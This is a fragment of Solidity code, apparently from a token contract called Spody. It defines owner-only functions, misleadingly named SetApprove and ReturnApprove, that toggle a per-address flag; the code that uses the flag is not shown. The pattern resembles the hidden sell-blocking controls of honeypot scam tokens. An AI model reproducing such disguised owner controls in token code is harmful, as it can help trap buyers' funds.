...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function SetApprove(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _allowance[_addresses_[i]] = true;
        }
    }

    function ReturnApprove(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _allowance[_addresses_[i]] = false;
        }
    }

    function CheckApprove(address _address_) public view returns (bool) {
...
contract Spody is ERC20 {
    constructor() ERC20("SPOODY", "Spoody") {
